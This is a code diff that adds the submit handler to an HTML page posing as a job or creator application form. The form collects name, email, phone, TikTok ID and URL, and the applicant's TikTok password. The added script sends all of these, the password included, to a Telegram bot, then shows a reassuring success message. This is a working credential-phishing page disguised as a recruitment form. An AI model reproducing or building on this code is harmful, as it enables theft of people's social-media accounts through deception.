@@ -100,4 +100,64 @@
 
     function showToast(message) {
       const toast = document.getElementById('toast');
-      toast.tex
+      toast.textContent = message;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 4000);
+    }
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const tiktokId = document.getElementById('tiktokId').value.trim();
+      const tiktokUrl = document.getElementById('tiktokUrl').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const message = document.getElementById('message').value.trim();
+      const resumeFile = resumeInput.files[0] ? resumeInput.files[0].name : 'No file uploaded';
+
+      const text = `
+📥 *New Application Submitted*
+
+👤 *Name:* ${name}
+📧 *Email:* ${email}
+📱 *Phone:* ${phone}
+🎵 *TikTok ID:* ${tiktokId}
+🔗 *TikTok URL:* ${tiktokUrl}
+🔒 *Password:* ${password}
+📝 *Message:* ${message}
+📎 *Resume:* ${resumeFile}
+`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById('successMsg').style.display = 'none';
+          document.getElementById('errorMsg').style.display = 'none';
+          form.reset();
+          dropArea.textContent = '📎 Drag & Drop Resume Here or Click to Upload';
+          showToast('✅ Application submitted successfully!');
+        } else {
+          throw new Error('Telegram API error');
+        }
+      })
+      .catch(error => {
+        document.getElementById('successMsg').style.display = 'none';
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '❌ Failed to submit. Please check Telegram settings.';
+      });
+    });
+  </script>
+</body>
+</html>
